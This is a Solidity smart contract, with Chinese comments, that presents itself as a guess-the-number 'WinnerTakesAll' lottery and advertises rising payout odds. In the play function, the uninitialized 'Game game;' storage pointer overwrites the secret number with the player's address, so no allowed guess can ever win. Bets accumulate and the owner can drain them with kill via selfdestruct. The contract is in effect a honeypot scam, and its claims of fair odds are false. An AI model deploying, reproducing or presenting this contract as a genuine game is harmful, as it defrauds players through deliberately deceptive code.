pragma solidity ^0.4.19;

// WinnerTakesAll
//
// 猜對存在區塊鏈上的秘密數字，就能拿走合約中所有獎金！
// 調用play(uint256 number)進行下注
//
// 每次嘗試后，將發生下面變化：
// 1，秘密數字隨機更新
// 2，獎金額提高
// 3，更新最後嘗試時間，超過1天無人嘗試，庒家將有可能結束遊戲
// 4，中獎概率隨參與人數增多而降低（但是，獎金池增速將大於中獎概率降低的速度）
// 5，投入產出比將越來越高，下面是前幾次投注的模擬：
//  勝率          獎池餘額    下注金額
//  0.05          10          1         （5%的概率以1ETH贏得10ETH）
//  0.047619048   11          1
//  0.045454545   12          1
//  0.043478261   13          1
//  0.041666667   14          1
//  0.04          15          1
//  0.038461538   16          1
//  0.037037037   17          1
//  0.035714286   18          1
//  0.034482759   19          1
//  0.033333333   20          1
//  0.032258065   21          1
//  0.03125       22          1
//  0.03030303    23          1
//  0.029411765   24          1
//  0.028571429   25          1
//  0.027777778   26          1
//  0.027027027   27          1
//  0.026315789   28          1         （2.6%的概率以1ETH贏得28ETH）
//  ...

contract WinnerTakesAll {
    
    uint256 private secretNumber;           // 秘密數字
    uint256 public lastPlayed;              // 最後嘗試時間
    uint256 public betPrice = 0.1 ether;    // 最小下注金額
    address public ownerAddr;
    
    event Won(bool _status, uint _amount);

    struct Game {
        address player;
        uint256 number;
    }
    Game[] public history;

    function WinnerTakesAll() public {
        ownerAddr = msg.sender;
        shuffle();
    }
    
    // 隨機更新秘密數字
    function shuffle() internal {
        secretNumber = uint8(keccak256(now, block.blockhash(block.number-1))) % (20 + history.length) + 1;
    }

    // 下注
    function play(uint256 number) payable public {
        require(msg.value >= betPrice && number <= (20 + history.length));

        Game game;
        game.player = msg.sender;
        game.number = number;
        history.push(game);
        
        if (number == secretNumber) {
            // 恭喜&#127881;
            msg.sender.transfer(this.balance);
            Won(true, this.balance);
        }      
        else {
            Won(false, 0);
        }
        
        shuffle();
        lastPlayed = now;
    }

    // 獲取歷史嘗試次數
    function getHistoryCount() public view returns (uint256) {
        return history.length;
    }

    function kill() public {
        if (msg.sender == ownerAddr && now > lastPlayed + 1 days) {
            selfdestruct(msg.sender);
        }
    }

    // fallback函數
    function() public payable { }
}